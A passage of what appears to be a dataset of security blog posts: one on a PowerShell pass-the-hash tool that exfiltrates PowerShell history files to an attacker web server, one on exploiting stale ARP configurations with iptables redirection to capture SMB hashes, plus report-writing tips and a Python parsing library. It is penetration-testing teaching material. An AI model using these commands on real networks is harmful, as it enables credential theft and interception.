credential. This organization had also deployed a number of other security tools that were making pivoting very difficult. Multiple EDR and behavioral analysis products were in use as well as application whitelisting. RDP was protected by multi-factor authentication and SMB wasn\u2019t accessible on hosts I was trying to pivot to. \n\nI was, however, able to connect to other systems using Windows Management Instrumentation (WMI). \n\nFrankenstein\n\nWith my goal being to obtain all PowerShell console history files on the network, I set out to write a script that could accomplish this for me. I had some interesting problems to solve though. I couldn\u2019t access SMB so simply copying the PSReadline files over the network wouldn\u2019t work. The hosts could access the Internet though. I ended up \u201cFrankensteining\u201d some other pre-existing tools along with my own code to accomplish my goal.\n\nFirst, I had to gather all the hosts from the domain. To do this, the first piece of code I borrowed was from PowerView. I used multiple modules from PowerView for generating a list of domain computers. Next, I utilized more pre-existing code, this time from Kevin Robertson\u2019s Invoke-TheHash to perform the authentication to each host. Invoke-WMIExec and Invoke-SMBExec have the ability to \u201cPass-the-Hash\u201d to run commands on remote systems. \n\nFor each system, Invoke-WMIExec would connect and launch PowerShell along with an encoded command blob that includes the code for discovering any PSReadline files found within any of the profiles on the system. If any are discovered they are then sent via a POST request to a web server I controlled. The Frankenstein code was alive and worked surprisingly well.\n\nCheck-LocalAdminAccess\n\nSo as it turned out the functionality of this script ended up being useful in a completely different manner. It functions as a standalone PowerShell tool for determining what hosts on the network a password hash is a valid administrative credential for. Very often we are still discovering that local administrator credentials are in widespread use on engagements. In the past, if I had a password hash I might use something like Metasploit\u2019s smb_login module to test that credential against other hosts. Having accessibility to Metasploit isn\u2019t always an option on assessments though. So, this script being a purely PowerShell way of testing a credential hash will allow us to perform this technique natively in Windows environments. \n\nCheck-LocalAdminHash is this tool. You can get it on Github at: https://github.com/dafthack/Check-LocalAdminHash\n\nBelow are some of the example commands you can run with Check-LocalAdminHash. By the way you can still exfiltrate the PSReadline files with it.\n\nChecking Local Admin Hash Against All Hosts Over WMI\n\nThis command will use the domain 'testdomain.local' to lookup all systems and then attempt to authenticate to each one using the user 'testdomain.local\\PossibleAdminUser' and a password hash over WMI.\n\nCheck-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local -Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -AllSystems\n\nExfiltrate All PSReadline Console History Files\n\nThis command will use the domain 'testdomain.local' to lookup all systems and then attempt to authenticate to each one using the user 'testdomain.local\\PossibleAdminUser' and a password hash over WMI. It then attempts to locate PowerShell console history files (PSReadline) for each profile on every system and then POST's them to a web server. The bottom of the blog post contains instructions for setting up the server side.\n\nCheck-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local -Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -AllSystems -ExfilPSReadline\n\nThe script also accepts target lists in CIDR format, list format, or you can specify single systems to test if you don\u2019t want to enumerate hosts from a domain. In addition to WMI, you can specify the SMB protocol if you would like to use that instead. \n\nPSReadline Exfiltration Setup\n\nThis is your warning that you are about to set up an Internet-facing server that will accept file uploads. Typically, this is a very bad thing to do, so definitely take precautions when doing this. I would recommend locking down firewall rules so that only the IP that will be uploading PSReadline files can hit the webserver. Also, while we are on the topic of security, this will work just fine with an HTTPS connection so set up your domain and cert so that the PSReadline files are sent encrypted over the network. You have been warned...\n\nSetup a server wherever you would like the files to be sent. This server must be reachable over HTTP/HTTPS from each system.\n\nCopy the index.php script from this repo and put it in /index.php in the web root (/var/www/html) on your web server.\n\nMake an uploads directory:\n\nmkdir /var/www/html/uploads\n\nModify the permissions of this directory:\n\nchmod 0777 /var/www/html/uploads\n\nMake sure php is installed:\n\napt-get install php\n\nRestart Apache:\n\nservice apache2 restart\n\nIn the Check-LocalAdminHash.ps1 script itself scroll down to the \"Gen-EncodedUploadScript\" function and modify the \"$Url\" variable right under \"$UnencodedCommand\". Point it at your web server index.php page. I haven't figured out how to pass the UploadUrl variable into that section of the code that ends up getting encoded and run on target systems so hardcode it for now.\n\nNow when you run Check-LocalAdminHash with the -ExfilPSReadline flag it should attempt to POST each PSReadline (if there are any) to your webserver.\n\nConclusion\n\nCheck-LocalAdminAccess was born out of necessity. If you find yourself on a Windows system without the availability of Linux-based tools and need to test a password hash, this should help provide a more native approach to testing credentials. Also, It wouldn\u2019t be difficult to modify the portion of the code that looks for PSReadline files to do other things on each host. In the future, I may change this to provide the ability to look for other files or run other commands on systems. \n\nCredits\n\nCheck-LocalAdminHash is pretty much a Frankenstein of two of my favorite tools, PowerView and Invoke-TheHash. 95% of the code is from those two tools. So the credit goes to Kevin Robertson for Invoke-TheHash, and credit goes to Will Schroeder, Matt Graeber, and anyone else who worked on PowerView. Without those two tools this script wouldn't exist. \n\nAlso, a shoutout to Steve Borosh for help with the multi-threading and just being an all-around awesome dude.\n\nInvoke-TheHash - https://github.com/Kevin-Robertson/Invoke-TheHash\n\nPowerView - https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Analyzing ARP to Discover & Exploit Stale Network Address Configurations\"\nTaxonomies: \"Author, How-To, Informational, Justin Angel, Red Team, Red Team Tools, ARP, BruteLoops, eavesarp, Justin Angel, MailSniper, netdiscover, SNAC, swisslogger\"\nCreation Date: \"Wed, 12 Jun 2019 18:33:47 +0000\"\nJustin Angel//\n\nIntroduction\n\nIn penetration testing, ARP is most commonly discussed in terms of poisoning attacks where an attacker achieves a man-in-the-middle (MITM) position between victim nodes by contaminating the ARP cache tables of neighboring hosts. While initially inspired by this technique and the desire to derive a means of passively obtaining a list of candidate targets, this post aims to look at ARP from a data analytics perspective by capturing and quantifying broadcast requests to identify intercommunicating network hosts.\n\nThe byproduct of this effort is a simple Python tool for Debian Linux called eavesarp that was heavily influenced by Jaime Penalba\u2019s netdiscover, which passively monitors for ARP requests and presents a table summarizing the sender, targets, and sum of ARP requests for each sender-target combination. Such information is key when plotting targeted ARP poisoning attacks and identifying stale network address configurations (SNACs), the latter being a misconfiguration that occurs when a client for a network service has been configured with a hardcoded IP address or FQDN that is no longer associated with a live host. eavesarp builds on the capabilities of netdiscover by providing active discovery of SNACs, while also providing DNS name resolution capabilities.\n\nIf the reader is comfortable with the brief introduction above, feel free to jump to the section titled Exploiting SNACs for the practical bits. Otherwise, the following subsections of this introduction will provide a bare-minimum summary of how ARP operates along with contextual information explaining why this came about.\n\nA Brief Word Regarding the Address Resolution Protocol (ARP)\n\nARP is a protocol used to resolve the MAC address for the NIC that has been configured with a given IP address. Requests are sent across the network in clear text such that any member of broadcast domain can observe and record them. There are countless articles on how to exploit weaknesses in ARP so this post will not discuss them at length, but glancing at the abstract in RFC 826 does provide basic terminology and insight used throughout the remainder of this post:\n\nsending host (sender) - The host that wants to interact with another host (target). This is the host that is requesting the MAC address associated with a known IP address.\n\ntarget host (target) - The destination host that the sender wishes to interact with. This is the owner of the MAC address associated with the IP address known by the sender.\n\nAlso keep in mind that only ARP requests are broadcasted, not replies, so it isn\u2019t possible to determine if a reply from the target is received without making an ARP request for the target or observing the response via MITM attack.\n\nContextual Babble\n\nDuring a recent engagement with BHIS, a client deployed a Kali-based host on an internal network segment to support testing. Minimal NetBIOS/LLMNR traffic was observed in the environment and attempts to exploit the broadcast nature of this traffic using Responder failed to capture weak password hashes. Additionally, relay attacks were ineffective due to proper enforcement of SMB signing on high-value hosts. Using MailSniper to verify usernames obtained via OSINT techniques and BruteLoops, a horizontal brute force attack using common passwords was performed but failed to yield valid credentials. Given that no glaring vulnerabilities on distinct applications and services were identified, the author elected to perform targeted ARP poisoning attacks to harvest hashes and other information. The issue quickly became identifying which hosts to target for poisoning while minimizing impact to network conditions.\n\nAs any rational assessor will attest, ARP poisoning attacks are as perilous as powerful: even a minor error while configuring the attack can result in denial of service (DoS) conditions. Consideration that this phase of the engagement was executed remotely, the author cannot stress the word \u2018targeted\u2019 enough.\n\nWhat does targeted mean in the context of ARP poisoning? From the author\u2019s perspective, the ideal MITM positioning is to become an intermediary node between the switch and client hosts known to interact with server hosts offering high-value services -- but not all of them simultaneously since the level of network traffic sent to the attacking node increases with each victim, thereby resulting in elevated odds of introducing DoS conditions. This \u201cMITM-the-client approach\u201d painstaking, but prudent when victim hosts are user workstations since an accidental DoS to a select number of workstations is preferable to a server hosting services that may be mission critical to the client environment.\n\nBut how can one go about identifying which hosts are interacting with one another on a network from an unauthenticated context?\n\nThough unable to know with absolute certainty that a given client is a consumer to the desired application-layer service offered by the server, monitoring broadcasted ARP requests reveals which hosts attempt to resolve the MAC address for servers at the link layer. Collecting and analyzing these requests over time unveils interesting relationships between hosts relative to network connections.\n\nTo be concise, I desired a tool that performed the following functions:\n\nMonitors a network interface for broadcasted ARP requests\n\nTracks the sender and target for each request\n\nMaintains a count of how often a given sender requests a target\n\nAlthough the author was unaware at the time of the engagement, netdiscover performs each of these functions and presents the analyzed data in a nice interactive interface. However, take note of the top record where the IP (.3) has requested the MAC address of .7 one hundred and sixty-one times (161). This is a key indicator of a SNAC. eavesarp builds on this concept by providing active verification of SNACs and providing DNS capabilities.\n\n netdiscover: Passively Capturing ARP Traffic \n\nFrom this point onward, this post will focus on describing, detecting, and exploiting SNACs. Given the appropriate conditions, this misconfiguration can be leveraged to achieve a MITM position between clients and services with minimal likelihood of degrading operational capabilities of the client environment.\n\nStale Network Address Configurations (SNACs)\n\nA SNAC (pronounced \u201csnack\u201d) occurs when the client for a network service has been configured with a static address value but no response is received when an ARP request is broadcasted to resolve the target MAC address, indicating that no host is currently configured with that IP address. This event can occur for various reasons, such as when DHCP issues a different address to the original host or if the original host has gone offline since the client was configured. Repetitive ARP broadcasts from a sender for a single target within a small window of time is a strong indicator of a SNAC since ARP responses are cached after receiving a valid reply from a given target.\n\nWhile events leading to an address configuration going stale are quite common, such a configuration can be exploited to achieve interesting ends. If the transport protocol for the service happens to be cleartext UDP then it\u2019s possible to capture traffic in transit by merely assuming the IP address of the stale configuration and sniffing traffic from the appropriate interface. Setting a second IP for a NIC is a trivial task given proper network conditions allowing one to alias a given NIC with multiple IPs (See the section titled IP Aliasing).\n\nExploiting SNACs when confronted with connection-oriented protocols presents an interesting situation since a connection must be established before the attacking host will receive any data beyond connection information. However, it\u2019s possible to work around this issue by capturing network traffic from an intercepting interface, determine common ports the vulnerable client/host is attempting to access and then bring a TCP listener online to accept the connection and initial data. This allows one to determine the higher-layer protocol by using the initial payload as a fingerprint. The final section of Exploiting SNACs (Services Using TCP as a Transport) demonstrates a potential MITM scenario that handles TCP oriented protocols by enabling IP masquerading on the attacking host.\n\nBefore jumping into exploitation of SNACs, two additional sections are provided to illustrate use of eavesarp and how to alias network interfaces on Linux and Windows hosts.\n\nSNAC Detection Using Eavesarp\n\nBasic usage of eavesarp is discussed here. All results were gathered from a reasonably small network where development took place. A single host has been intentionally configured to act as a SNAC (.2) targeting .101 as the stale address, which is why there is at least one target that will always have a glaringly larger count of ARP requests.\n\nStarting eavesarp in passive mode (default) while specifying the proper NIC results in a basic table being returned unveiling that sender .2 is requesting the MAC of target .101 much more frequently than any other target in the broadcast domain. This is the indicator described in Stale Network Address Configurations (SNACs).\n\n eavesarp: Passive Collection of ARP Requests \n\nNote in the image above that output is sorted by the sender generating the greatest number of ARP requests in a descending fashion, as are the corresponding targets associated with that sender. This is intended to facilitate quick identification of senders affected by SNACs. Also observe that the records are blocked by color while printing the sender address only a single time per block, making the output easier to digest by eliminating the duplicate sender values. If MAC addresses are desired, use the -oc (--output-columns) option to specify which values to display.\n\n eavesarp: Including MAC Addresses \n\nBasic execution of eavesarp is passive because only broadcasted ARP requests are captured and analyzed. The MAC for .3 is set to \u2018[UNRESOLVED]\u2019 above because no ARP requests from that IP has been received as a sender -- only a target.\n\nActive checks can be configured as well, which will confirm if a given configuration is stale by making an ARP request for the target observed in a broadcasted request. DNS resolution can be enabled to perform reverse name resolution for both the sender and target address, providing PTR record values. This is useful in situations where hostnames are descriptive and may help make ARP poisoning attacks more targeted. The following image shows a continuation of the previous capture with these capabilities enabled. Emojis present in the stale column indicates a SNAC.\n\n eavesarp: Active Detection Capabilities Enabled \n\nThe final column intends to communicate if the target IP is different than the forward IP associated with the target PTR, which may indicate that the stale configuration is intended for the host that now owns the forward IP. In this scenario, it may be possible to enable IP forwarding on the attacking host, assume the IP of the stale configuration, and then become a man-in-the-middle for the intended host that owns the forward IP by rewriting packets at the IP/TCP layer. Given use of cleartext protocols between the sender and legitimate host, this can result in capture/modification/relay of sensitive information in transit. This is the premise of the section titled Services Using TCP as a Transport in the Exploiting SNACs section.\n\nWhile this capability is only aesthetic, the user can always specify a color profile to suit the current mood. The author has been using the foxhound profile because he\u2019s a geek for Metal Gear Solid and it\u2019s a nice throwback to the interface used in Sons of the Patriots. Starting eavesarp while selecting a valid value to pass to the --color-profile option (-cp) results in a change of appearance.\n\n eavesarp: 1337 Color Profile \n\n eavesarp: Rhino Color Profile \n\n eavesarp: Cupcake Color Profile \n\nThe remainder of this post will now focus on the exploitation of SNACs, starting with a brief overview of how to alias network interfaces with multiple IP addresses.\n\nhttps://i.imgur.com/EcJ3MfG.gif?1\n\nIP Aliasing\n\nAssigning additional IP addresses to a single NIC is known as IP aliasing. When an ARP request for a target IP assigned to that interface, static or alias, the host will respond with the same MAC address. It is this capability that allows us to abuse SNACs without having to poison the ARP cache of neighboring hosts.\n\nWhen on a Debian Linux host, the following commands can be executed to add or delete an IP alias to a target interface.\n\nip a add / dev \n\nip a del / dev \n\nThough slightly more convoluted (as always) this can be applied in Windows as well by first assigning a static IP to the target interface, clicking the \u2018Advanced\u2019 Button, and proceeding to add a new configuration via the \u2018Add\u2019 button in the \u2018Advanced TCP/IP Settings\u2019 window.\n\n Configuring an Alias on Windoze \n\nExploiting SNACs\n\nThis section details two potential scenarios where exploitation of SNACs is possible. First, a syslog configuration is targeted and represents the simplest of scenarios because the UDP transport requires no connection setup -- it effectively \u201cshovels\u201d free data to the aliased interface. The second targets SMB and is somewhat contrived but provides a foundation for targeting TCP protocols.\n\nServices Using UDP as a Transport Protocol\n\nThe syslog scenario described above manifested in the environment discussed in the Contextual Babble section. A misconfigured client was configured with a value that resolves to an IP address that cannot be resolved to a MAC using ARP. This client was logging records in clear text that contained artifacts originating from the query string of HTTP requests processed by a web server. These records just so happened to contain cleartext credentials and other sensitive information.\n\nTo prevent disclosure of environmental details, the author created a Python script (swisslogger) to replicate this scenario and is available at the first URL below should the reader wish to replicate the attack for experience-building purposes. swisslogger effectively simulates an easily exploitable SNAC vulnerability when configured to point to an unassigned IP address by continuously attempting to send syslog records, in turn producing constant ARP requests.\n\nBelow are links to eavesarp and swisslogger:\n\nhttps://github.com/arch4ngel/swisslog\n\nhttps://github.com/arch4ngel/eavesarp\n\nThe following image shows the execution of the swisslogger while setting the IP to a stale value. It simply just begins churning logs out to the address specified in the host parameter.\n\n swisslogger: Initiating Continuous Stream of Syslog Records \n\nThe following table summarizes the hosts involved at this stage of the demonstration.\n\nIP AddressRoleHostnameNotes192.168.86.2senderironThis host is vulnerable due to a stale network address configuration via swisslogger. Upon execution, it will begin making consistent ARP requests targeting .101, indicating a SNAC.192.168.86.5attackerdeskjetThis host will run eavesarp to detect the stale configuration applied to .2 and will be used to receive traffic from .2 after assuming the .101 address. This host will respond to any ARP request for .101 after aliasing.192.168.86.101targetsyslogThis address is not in use by any host until .5 will be aliased\n\nStarting eavesarp while specifying the proper NIC reveals that sender .2 is requesting the MAC of target .101 much more frequently than any other target in the broadcast domain. This is the indicator described in Stale Network Address Configurations (SNACs).\n\n eavesarp: Passive Collection of ARP Requests \n\nSender .2 appears to be afflicted with a SNAC and target .101 is now suspect of being an unused IP address. It\u2019s possible to verify this observation by whitelisting only .101 using the --target-whitelist flag and enabling ARP resolution (-ar), as shown in the following image (Note that column ordering is optional).\n\n eavesarp: Active Confirmation of Stale Target \n\nNow is the time to alias the interface. It can be seen in the following images that ARP requests from sender .2 for target .101 halt after aliasing and syslog traffic generated by the swisslogger script is being received. The date command was executed just before implementing the alias in the first image and the timestamp shown in tcpdump capture aligns perfectly.\n\n ip (.5/.101): Aliasing Network Interface with the Target Address \n\n tcpdump (.5/.101): Capturing Syslog Traffic \n\nThe syslog example is simple enough that it almost feels fabricated, however dealing with higher layer protocols using TCP as a transport will inherently become more complex because the attacking machine will need to handle connection establishment before receiving meaningful data from the SNAC.\n\nServices Using TCP as a Transport Protocol\n\nAs mentioned in the SNAC detection section, eavesarp also supports active ARP and DNS resolution. It begins by enumerating any PTR records for senders and targets, followed by performing forward resolution of recovered PTR values. The following image shows execution of eavesarp while enabling ARP and DNS resolution and applying a whitelist only for the known stale target address (.101).\n\n eavesarp: Performing ARP and DNS Resolution for the Target Address \n\nObserving that PTR records are defined for each host, we can now use the analyze subcommand and take a closer look at the stale target address. The analyze command differs from the capture command by analyzing raw pcap files or SQLIte database files generated by eavesarp, though it should be noted that the same analysis options are available when executed in capture mode. \n\n eavesarp: Analyzing Output Database to Identify MITM Opportunities \n\neavesarp has compared the forward address to the value observed in the initial ARP request and identified dissonance, as communicated in the final column. This may indicate that the true target host has changed IP addresses to the forward value, representing a potential MITM opportunity.\n\nNote: This post is about to take a sharp turn into Fiction City, established in the great state of Creative Liberty. It\u2019s contrived, but it should provide a foundation for future work.\n\nAt this point, let\u2019s assume that the neighboring host (.102) is indeed the intended target host needed by the sender (.2) but is currently unable to access it due to the SNAC. Let\u2019s also assume that a network administrator, Karen, has noticed strange ARP behavior originating from the sender and decided to verify the configuration parameters of the syslog client. However, after physically walking to .2 and authenticating (FICTION), she\u2019ll try to access the stale target address over SMB to get additional configuration information before applying any changes.\n\nFor clarity, the following table has been updated to reflect the additional upstream host in addition to new configurations:\n\nIP AddressRoleHostnameNotes192.168.86.2sender(SNAC)ironThis host is vulnerable due to a stale network address configuration via swisslogger. Karen will log on here and try to access an upstream SMB share for magic datas on .101 as she is unaware that the address has changed.192.168.86.101targetsyslogThis address has been aliased to the interface of .5, the attacking host.192.168.86.5attackerdeskjetThis host has been aliased with .101 and will be configured with firewall rules to support IP masquerading (nat).192.168.86.102intended targetw10This is the host that originally had the .101 IP address but has since been changed to .102, resulting in a SNAC. All traffic will now be forwarded to this address via firewall rules. \n\nAs described above, we know that Karen is about to access .101 over SMB to get configuration information because she is unaware that the IP of the intended target has changed to .102. We can handle this situation by borrowing from Laurent Gaffie\u2019s work and enable IPv4 forwarding on the attacking. followed by implementing firewall rules to rewrite packets to be addressed to .102.\n\nsysctl net.ipv4.conf.eth1.forwarding=1\n\niptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE\n\niptables -t nat -A PREROUTING --dst 192.168.86.101 -j DNAT --to-destination 192.168.86.102\n\nAnother tcpdump session is initialized prior to authenticating to .101 from .2 so that traffic can be captured and analyzed, then smbclient can be used to simulate the SMB session initiated by Karen. As elucidated below, Karen has access to the SMB share hosted on the intended target host while mistakenly referencing the stale address identified earlier (.101).\n\n smbclient (.2): Karen Authenticates to the Stale IP Address \n\n tcpdump (.5/.101): Capturing Traffic for Analysis \n\nReview of captured traffic using Wireshark shows that hashed credentials were captured as expected and PCredz (more Laurent Gaffie wizardry) can be used to dump them from the capture file for offline dictionary-based brute force attacks.\n\n Wireshark: Dissecting the Session Setup Request \n\n PCredz: Dumping Karen\u2019s Super Strong Password Hash \n\nhttp://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html\n\nConclusion\n\nDetection and exploitation of SNACs is a trivial process when operating in an environment where IP aliasing is feasible. Though the proof of concept tool developed to facilitate detection is currently available only for Linux, developing a tool for other operating systems should not represent a great challenge. Impact stemming from exploitation of a SNAC is relative to the type of network traffic originating from the sender, the simplest of which results in capture of arbitrary network traffic that may contain sensitive information.\n\nBlue Recommendations\n\nConfigure network infrastructure to enforce Dynamic ARP Inspection (DAI), a control preventing the use of aliased IP addresses and ARP poisoning attacks by assuring ARP responses are honored only when the MAC to IP binding is present in an authoritative database (simplification)\n\nMonitor for excessive ARP requests for a specific IP address within an unreasonable timeframe\n\nDebian hosts cache a given ARP response for 60 seconds by default. This configuration can be inspected/configured by interacting with the following file:\n\n/proc/sys/net/ipv4/neigh/default/gc_stale_time\n\nNewer versions of Windows generate a value upon successful resolution but are marked \u201cstale\u201d if not used again between 15 and 45 seconds\n\nMonitor for invalid DNS records that point to abandoned IPs since clients may be configured with the friendly value, resulting in SNAC\n\nThough not tested, LaBrea (as recommended by @strandjs) should prevent detection and exploitation of SNACs by tarpitting hosts that exhibit SNAC behavior\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Your Reporting Matters: How to Improve Pen Test Reporting\"\nTaxonomies: \"Author, Brian King, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Brian King, macros, MSWord Tricks, Pen Test Reports, reports, screenshots\"\nCreation Date: \"Mon, 29 Jul 2019 15:38:07 +0000\"\nBrian B. King //\n\nThis is a companion post to BBKing's \"Hack for Show, Report for Dough\" report, given at BSides Cleveland in June 2019.\n\nThe fun part of pentesting is the hacking. But the part that makes it a viable career is the reporting. You can develop the most amazing exploit for the most surprising vulnerability, but if you can't document it clearly for the people who need to fix it, then you're just having fun. Which is fine! Fun is awesome! But if you want to get hired again, your reports need to be at least as clear and useful as your hacks are awesome.\n\nGuiding Principles\n\nBefore getting into the details, it's helpful to have a mental framework to hang them on. Everything about your report should help the reader understand what you, in your expert opinion, found interesting about the target of your test.\n\n\"Interesting\" is a word that can't usually stand by itself. It's too vague. Here, interesting means the vulnerabilities, of course, but it also includes positive things. If you have a go-to technique or attack that usually works but failed this time - that's interesting. Anything you noticed that was unusually good or consistent is interesting and should be included too.\n\nTwo Audiences\n\nThere will be at least two kinds of people reading your report, and you need to communicate clearly with both of them.\n\nYou'll have technical people who will need to understand how you did what you did so they can replicate your results and devise fixes that actually work. Imagine writing to yourself at the skill level you had one year ago. If you've been at this a long time, picture an intelligent and motivated friend who does system administration or software development. Someone who understands the context but maybe not the details. Someone you want to help.\n\nThat's your technical reader. Write the body of the report so that person can re-do the things you did and see the things you saw.\n\nYou'll also have business people who will need to understand why your findings are important, and what business processes are involved, either as causes or solutions. Imagine a person who cares deeply about what you have to say - they hired you because you're an expert after all - but who focuses more on what gets done than on the details of how. This person wants to keep the business running and would love it if that can be done securely. They think in terms of business processes, not computer systems. They may not have a favorite text editor. Just like your technical reader, your business readers are intelligent and motivated - they just work with different things, one or two layers of abstraction away from the actual systems.\n\nThat's your business reader. Write the executive summary so this person appreciates the overall situation, the few most significant findings, and what business processes, policies or cultural norms can be brought to bear on them.\n\nFacts, Then Context, Then Opinions (i.e. \"an argument\")\n\nThe facts that you find are at the core of the report, but they themselves are not the report. Your expert judgment about those facts is also fundamental, but your judgment is not the same kind of thing as a fact. Your judgment is certainly valuable - that's part of why you were asked to do this - but it's a different kind of thing. Make that difference obvious in the way you write the report.\n\nDescribe the facts of the situation. Provide evidence to substantiate the facts. Put the facts in context by showing how they affect the environment and its security. Then discuss what can be done about them (not what must be done about them). Provide references to reputable independent sources that cover the same topic. If the issue is controversial, include references that take an alternate view. It's OK to explain why you disagree with that view, but be sure to lay out the whole story so your reader can make an informed decision about what's right for them.\n\nInform the reader with facts and references. Persuade the reader with argument. Make your best recommendation, and then leave the final decision to them.\n\nIllustrate, Don't Decorate\n\nScreenshots can save a lot of typing. A good screenshot can illustrate the core \"fact\" and also provide much of the needed \"context\" around it.\n\nA good screenshot is...\n\naccurate in that it shows a fact that is relevant to the issue at hand.\n\nprecise in that it shows as little else as practical.\n\nsized so that any relevant text in it is readable and about the same size as the text near it in the report.\n\nA bad screenshot...\n\nmakes the reader figure out which part of it is important.\n\nis scaled so the text is unreadably small or far larger than the surrounding text.\n\nmakes the reader start to ignore your screenshots so that even the good ones stop helping.\n\nHere's an example. Can you tell what the problem is, here, in this uncropped screenshot with nothing to direct your attention?\n\nAs a general rule, if your webapp screenshot includes the browser chrome, think about whether you can make it more focused. Like this:\n\n Content Delivered Without HTTPS \n\nNow that's more clear. The URL is legible. The boxes and arrows force the reader to notice the interesting parts. There's a caption to put it into words. If you know about webapps, you can't look at this and not recognize the problem.\n\nYou can disagree about the problem, of course. Maybe there's a Good Reason (tm) for not forcing HTTPS. But this screenshot helps you know for sure what you're disagreeing about, and that's the whole point.\n\nMSWord Tricks\n\nNow for a few quick things that can save time and help with consistency when writing reports in Microsoft Word.\n\nInstant Screenshots\n\nYou can take screenshots directly in Word. Put your cursor where you want the screenshot and then do:\n\n Insert > Screenshot > Screen Clipping \n\nThe MS Word window will minimize itself and the entire desktop will gray out slightly. Click and drag a rectangle over what you want in the screenshot. When you release the mouse button, the screenshot will be in your document.\n\nIf you want to edit it later, save it as a file first in order to get the full resolution. Right-click and \"save as...\" then open that file in your image editor.\n\nWord started adding \"automatic alt text\" to screenshots sometime in 2019. As you might guess, it's not very good at this, but it can be entertaining. If you're done being entertained by it, you can disable it via File > Options > Ease of Access > Automate Alt Text. Uncheck that box.\n\nAbusing Autocorrect\n\nThe same thing that changes \"teh\" to \"the\" can be used to change any text into anything else. The replacement can have formatting embedded in it.\n\nHere's some possible text (including formatting) I just made up for an example.\n\n Boilerplate Text We Don't Want To Type Again \n\nSelect whatever you want as the replacement text (i.e. the thing you don't want to have to type again) and copy it to the clipboard. In this example, select all three lines above and tap Ctrl-C.\n\nThen, open the AutoCorrect Options\n\n File > Options > Proofing > AutoCorrect Options... \n\nNotice that the contents of your clipboard are pre-filled in the \"replace with\" column. Type the abbreviation you want to stand in for this. Make sure it's not something you'd type as a standalone word so that it doesn't trigger unexpectedly. Suggestion: start these with the letter 'i' (for \"insert\") to avoid collisions.\n\n Type Your Substitution Word Here \n\nOnce this is set, any time you type \"issl\" it will be replaced with what's in the second column. To trigger the replacement, your abbreviated text must appear as a word: with whitespace both before and after it.\n\nLegitimate Macros\n\nIf you do a thing to blocks of text repeatedly, look at recording a macro for whatever that thing is. You don't have to write the macro, you can set Word to record, then do the steps, then save the recording.\n\nThen you can re-run what was recorded, or you can edit the macro however you need to, using the code it generated as a guide.\n\nCustomize the Quick Access Toolbar\n\nThe Quick Access Toolbar is the left side of the title bar of any Word window. By default, it has Save, Undo, and Redo. You can remove those if you don't want them, and you can add anything you like here, including macros.\n\n Quick Access Toolbar in Red \n\nTo customize this, go to \n\nFile > Options > Quick Access Toolbar\n\nYour Report Matters More than Your Hacking\n\nA test is not a thing you can deliver. Nobody pays for a test. A test is a series of actions that you do in the moment. The thing you deliver - the actual item the customer is paying for - is the report. Most tests fade into memory and blur quickly. The report will live forever. The report will drive decisions. Help your reader make good decisions. Make sure that everything in your report is helpful and clear. Accurate and precise. It matters.\n\nVideo Link:\n\nhttps://youtu.be/NUueNT1svb8\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"PyFunnels: Data Normalization for InfoSec Workflows\"\nTaxonomies: \"General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Github, PyFunnels, Python3, TJ Nicholls, Tool Output\"\nCreation Date: \"Tue, 13 Aug 2019 15:40:05 +0000\"\nTJ Nicholls // *BHIS Guest Contributor\n\nTL;DR\n\nHow many times have you had to parse the same output from a tool? Wouldn\u2019t you like to get that time back?\n\nThere is a lot of overlap in the tools we use and the workflows we perform as information security professionals. Let's not reinvent the wheel every time we need to extract data from a tool. \n\nPyFunnels can act as a centralized and collaborative library. Enjoy the fruit of someone else's labor. ? If the capability isn\u2019t there, consider committing your Python3 code to the library in GitHub for future use. Below is a quick example to get started.\n\npip install pyfunnels\n\nfrom PyFunnels import PyFunnels\n#Specify the output file for each tool in a dictionary.\nsource_files = {\n \"spiderfoot\":\"/path/to/file/spiderfoot.db\",\n \"nmap\":\"/path/to/file/nmap_results.xml\",\n \"TheHarvester\":\"/path/to/file/theharvester-tester.xml\"\n}\n#Create a PyFunnels object.\nPyF = PyFunnels.Funnel(source_files)\n#Do something with it\ndomains = PyF.funnel_data(\"domains\")\nfor d in domains:\n pass #Your use case here.\n\nCurrently, supported tools and data points can be viewed with a method.\n\nPyF = PyFunnels.Funnel()\ncapabilities = PyF.get_capabilities()\nprint(capabilities)\n\nStarting the Project\n\nAs part of my Master of Science in Information Security Engineering (MSISE) from SANS, I recently began a new project. The project needed to address something in security that hasn\u2019t been solved. I set a priority for myself that it would be a Python coding project because it is a skill set I needed to improve. While taking a SANS course pertaining to the CIS critical controls, I learned that a key success of implementing a security control is automating it. This way, the control lives on when you move on to new projects. It is a great way to scale security and something I\u2019ve been trying to incorporate into my projects. With that in mind, I also wanted the project to help with automation.\n\nSo, what fits in this scope and has not been addressed? This was a challenging question for me to answer. I began by brainstorming tasks that I perform on a regular basis and processes that would make my life easier. I put some feelers out to colleagues and went back and forth with my advisor. \n\nAn early idea was to figure out how to normalize indicators from incidents or cases so that pertinent data could be integrated into tools and possibly shared. Through some Googling, I quickly came across security incident response platforms (SIRP\u2019s) like theHive project. This was a win and a loss. Dang, someone already did it. Oh wow, that is really cool, someone already did it! \n\nI then began contemplating a way to normalize the output of tools. I believe it is something we as information security professionals reinvent constantly in our own workflows. In other words, there is a lot of overlap in the tools we use. If you and I want to enumerate domains and subdomains for a net block, chances are we may use at least one of the same tools during that process. So my thought was, why redo the work of parsing the output when it is something that has been done a hundred times over. There is usually nothing particularly hard about parsing output, especially if you use just one tool. But we have better things to do with our day, and the task starts taking more time if you use multiple tools to increase the fidelity of your findings. \n\nPyFunnels\n\nEnter Pyfunnels. PyFunnels is a Python3 library designed to aggregate data from tools and return a unified dataset. Even though the output from tools may not be standard, we can build reliable ways to retrieve the data. \n\nConsider that we have one or more tools used to collect data. Tools typically have output that consists of multiple data points. When I say \u2018data points\u2019, I am simply referring to things like IP addresses, URLs, domain names, emails, files, login pages, etc. \n\nThe idea is to isolate those data points. The way you do that for each tool will be different, but we need a unified way to get a data point from each output. That is really the core of 